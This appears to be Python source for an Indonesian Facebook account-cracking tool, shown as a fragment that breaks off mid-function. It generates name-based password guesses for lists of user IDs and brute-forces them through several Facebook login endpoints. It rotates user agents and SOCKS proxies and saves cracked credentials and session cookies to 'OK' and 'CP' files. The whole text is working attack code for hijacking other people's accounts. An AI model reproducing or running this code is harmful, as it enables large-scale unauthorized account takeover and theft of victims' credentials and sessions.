	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	prints(nel(f'       {P2}{M2}!{P2} PROSES MENGINTIP SEDANG {M2}{len(id)} {P2}BERJALAN {M2} !{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'321')
					pwv.append(frs+'01')
					pwv.append(frs+'02')
					pwv.append(frs+'03')
					pwv.append(frs+'04')
					pwv.append(frs+'05')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'321')
					pwv.append(frs+'01')
					pwv.append(frs+'02')
					pwv.append(frs+'03')
					pwv.append(frs+'04')
					pwv.append(frs+'05')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'metod1' in method:
				pool.submit(crack,idf,pwv)
			elif 'metod2' in method:
				pool.submit(reguler1,idf,pwv)				
			elif 'metod3' in method:
				pool.submit(crackfree,idf,pwv)				
			elif 'metod4' in method:
				pool.submit(metod1,idf,pwv)
			elif 'metod5' in method:
				pool.submit(metod2,idf,pwv)
			
			else:
				pool.submit(crackmbasic,idf,pwv)
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))

	#--------------------[ METODE-MOBILE ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	print(f'\r%s%s/%s OK : %s CP : %s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1694528995138%26e2e%3D%257B%2522init%2522%253A1694528995139%257D%26ies%3D1%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D3131f419-7a89-4e33-a62b-8aa7a8788021%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25223f61d7bf-a98b-46b0-a5b9-52917cf711c5%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522bqed7795m8qag865amg4%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D3f61d7bf-a98b-46b0-a5b9-52917cf711c5%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25223f61d7bf-a98b-46b0-a5b9-52917cf711c5%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522bqed7795m8qag865amg4%2522%257D&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr') 
			data = {
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
'email': idf,
'prefill_contact_point': idf,
'prefill_source': 'browser_onload',
'prefill_type': 'contact_point',
'first_prefill_source': 'browser_dropdown',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true',
'had_password_prefilled': 'false',
'is_smart_lock': 'false',
'bi_xrwh': '0',
'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
'fb_dtsg': '',
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'__dyn': '',
'__csr': '',
'__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']), 
'__a': '',
'__user':0
}
			headers = {'Host': 'm.facebook.com','content-length': '2146','sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"','sec-ch-ua-mobile': '?1','user-agent': ua,'content-type': 'application/x-www-form-urlencoded','x-fb-lsd': 'AVqI9RPLQs0','x-asbd-id': '198387','save-data': 'on','sec-ch-ua-platform': '"Android"','accept': '*/*','origin': 'https://m.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1694528995138%26e2e%3D%257B%2522init%2522%253A1694528995139%257D%26ies%3D1%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D3131f419-7a89-4e33-a62b-8aa7a8788021%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25223f61d7bf-a98b-46b0-a5b9-52917cf711c5%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522bqed7795m8qag865amg4%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D3f61d7bf-a98b-46b0-a5b9-52917cf711c5%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25223f61d7bf-a98b-46b0-a5b9-52917cf711c5%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522bqed7795m8qag865amg4%2522%257D&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=953097631439235&auth_token=1ef022a98f148abfc64c688a7c5a872e&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D953097631439235%26cbt%3D1694527938425%26e2e%3D%257B%2522init%2522%253A1694527938425%257D%26ies%3D1%26sdk%3Dandroid-11.3.0%26sso%3Dchrome_custom_tab%26nonce%3D6e332152-92c4-4d0a-aa2b-bc4ba4befe48%26scope%3Dopenid%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25226e332152-92c4-4d0a-aa2b-bc4ba4befe48%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25227hhppsvr0qgnuu1o5825%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb953097631439235%253A%252F%252Fauthorize%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D6e332152-92c4-4d0a-aa2b-bc4ba4befe48%26tp%3Dunspecified&refsrc=deprecated&app_id=953097631439235&cancel=fb953097631439235%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25226e332152-92c4-4d0a-aa2b-bc4ba4befe48%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25227hhppsvr0qgnuu1o5825%2522%257D%23_%3D_&lwv=100',data=data,headers=headers)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r--->{K}{idf}---{pw}{N}\n--->{P}{ua}{N}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\rID :   {H}{idf}\n{P}PW :  {H} {pw}{N}\nCOKI : {P}{kuki} \n. {P}{ua}{N}')
				
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ METHOD REGULER ]--------------------#
def reguler1(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold purple]Reguler V1[bold white] {loop}/{len(id)} OK-:[bold purple]{ok}[/] CP-:[bold red]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'm.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://m.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://m.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.Kues.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold red', title='AraiiXyz-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.Kues.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.Kues.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.Kues.get_dict().items() ])
					print('\n')
					statusok = f'[[•]] ID       : {idf}\n[[•]] PASSWORD : {pw}\n[[•]] KueS  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold purple', title='AraiiXyz-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#------------------[ METODE-MBASIC-2 ]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{x}[M2] | {P}{loop}{P} | {H}LIVE-{ok} {P}| {K}CHECK-{cp}")
	sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link= ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=312563225523989&kid_directed_site=0&app_id=312563225523989&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv17.0%2Fdialog%2Foauth%3Fapp_id%3D312563225523989%26cbt%3D1694968006466%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3520793fb24f3c%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%26client_id%3D312563225523989%26display%3Dtouch%26domain%3Dm.shein.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fm.shein.com%252Fid%252Fuser%252Fsetting%26locale%3Den_US%26logger_id%3Df3bbbc53ca261cc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3e1bba7bfb1b54%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%2526frame%253Df1db714302eb3d4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv17.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3e1bba7bfb1b54%26domain%3Dm.shein.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fm.shein.com%252Ff3d3220ff07f6a8%26relation%3Dopener%26frame%3Df1db714302eb3d4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=312563225523989&kid_directed_site=0&app_id=312563225523989&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv17.0%2Fdialog%2Foauth%3Fapp_id%3D312563225523989%26cbt%3D1694968006466%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3520793fb24f3c%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%26client_id%3D312563225523989%26display%3Dtouch%26domain%3Dm.shein.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fm.shein.com%252Fid%252Fuser%252Fsetting%26locale%3Den_US%26logger_id%3Df3bbbc53ca261cc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3e1bba7bfb1b54%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%2526frame%253Df1db714302eb3d4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv17.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3e1bba7bfb1b54%26domain%3Dm.shein.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fm.shein.com%252Ff3d3220ff07f6a8%26relation%3Dopener%26frame%3Df1db714302eb3d4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			cokz = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
			cokz+=' m_pixel_ratio=2.625; wd=412x756'
			head={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Not)A;Brand";v="98", "Chromium";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.7,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','x-requested-with': 'com.facebook.katana','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=312563225523989&kid_directed_site=0&app_id=312563225523989&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv17.0%2Fdialog%2Foauth%3Fapp_id%3D312563225523989%26cbt%3D1694968006466%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3520793fb24f3c%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%26client_id%3D312563225523989%26display%3Dtouch%26domain%3Dm.shein.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fm.shein.com%252Fid%252Fuser%252Fsetting%26locale%3Den_US%26logger_id%3Df3bbbc53ca261cc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3e1bba7bfb1b54%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%2526frame%253Df1db714302eb3d4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv17.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3e1bba7bfb1b54%26domain%3Dm.shein.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fm.shein.com%252Ff3d3220ff07f6a8%26relation%3Dopener%26frame%3Df1db714302eb3d4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=data,cookies={Kue: cokz},headers=head,allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}[{H}OK{P}] : {H}{idf}|{pw}\n{H}{kuki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}[{K}CP{P}] : {K}{idf}|{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#---------------------[ METODE-]---------------------#
def metod1(uid,pwv):
	global loop,ok,cp
	ua = rc(ugen)
	ses = requests.Session()
	sys.stdout.write(f"\r{P}TYPO Z|{loop}|{H}OK-{ok}{P}|{K}CP-{cp}")
	for pw in pwv:
		try:
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=140235673279940&kid_directed_site=0&app_id=140235673279940&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fapp_id%3D140235673279940%26auth_type%26cbt%3D1704088960393%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2b1bb72145b1f%2526domain%253Dmy.freenom.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmy.freenom.com%25252Ff3d9804737545e%2526relation%253Dopener%26client_id%3D140235673279940%26config_id%26display%3Dtouch%26domain%3Dmy.freenom.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fmy.freenom.com%252Fclientarea.php%26force_confirmation%3Dfalse%26id%3Df379798f8b6896%26locale%3Den_US%26logger_id%3Db4cc7aa7-274b-4da7-8c07-d2550065a43a%26messenger_page_id%26origin%3D2%26plugin_prepare%3Dtrue%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df345bdf985ded9%2526domain%253Dmy.freenom.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmy.freenom.com%25252Ff3d9804737545e%2526relation%253Dopener.parent%2526frame%253Df379798f8b6896%26ref%3DLoginButton%26reset_messenger_state%3Dfalse%26response_type%3Dsigned_request%252Ctoken%252Cgraph_domain%26scope%26sdk%3Djoey%26size%3D%257B%2522width%2522%253Anull%252C%2522height%2522%253Anull%257D%26url%3Ddialog%252Foauth%26version%3Dv12.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df345bdf985ded9%26domain%3Dmy.freenom.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fmy.freenom.com%252Ff3d9804737545e%26relation%3Dopener.parent%26frame%3Df379798f8b6896%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
'email': uid,
'prefill_contact_point': uid,
'prefill_source': 'browser_onload',
'prefill_type': 'contact_point',
'first_prefill_source': 'browser_dropdown',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true',
'had_password_prefilled': 'false',
'is_smart_lock': 'false',
'bi_xrwh': '0',
'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
'fb_dtsg': '',
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'__dyn': '',
'__csr': '',
'__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']), 
'__a': '',
'__user':0
}
			headers = {
'authority': 'm.facebook.com',
'accept': '*/*',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
'content-type': 'application/x-www-form-urlencoded',
'dpr': '2',
'origin': 'https://m.facebook.com',
'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=140235673279940&kid_directed_site=0&app_id=140235673279940&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fapp_id%3D140235673279940%26auth_type%26cbt%3D1704088960393%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2b1bb72145b1f%2526domain%253Dmy.freenom.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmy.freenom.com%25252Ff3d9804737545e%2526relation%253Dopener%26client_id%3D140235673279940%26config_id%26display%3Dtouch%26domain%3Dmy.freenom.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fmy.freenom.com%252Fclientarea.php%26force_confirmation%3Dfalse%26id%3Df379798f8b6896%26locale%3Den_US%26logger_id%3Db4cc7aa7-274b-4da7-8c07-d2550065a43a%26messenger_page_id%26origin%3D2%26plugin_prepare%3Dtrue%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df345bdf985ded9%2526domain%253Dmy.freenom.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fmy.freenom.com%25252Ff3d9804737545e%2526relation%253Dopener.parent%2526frame%253Df379798f8b6896%26ref%3DLoginButton%26reset_messenger_state%3Dfalse%26response_type%3Dsigned_request%252Ctoken%252Cgraph_domain%26scope%26sdk%3Djoey%26size%3D%257B%2522width%2522%253Anull%252C%2522height%2522%253Anull%257D%26url%3Ddialog%252Foauth%26version%3Dv12.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df345bdf985ded9%26domain%3Dmy.freenom.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fmy.freenom.com%252Ff3d9804737545e%26relation%3Dopener.parent%26frame%3Df379798f8b6896%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
'sec-ch-prefers-color-scheme': 'light',
'sec-ch-ua': f'"Not_A Brand";v="{str(rr(8,24))}", "Chromium";v="{str(rr(110,120))}"',
'sec-ch-ua-full-version-list': f'"Not_A Brand";v="{str(rr(8,24))}.0.0.0", "Chromium";v="{str(rr(110,120))}.0.{str(rr(3000,6000))}.{str(rr(110,120))}"',
'sec-ch-ua-mobile': '?1',
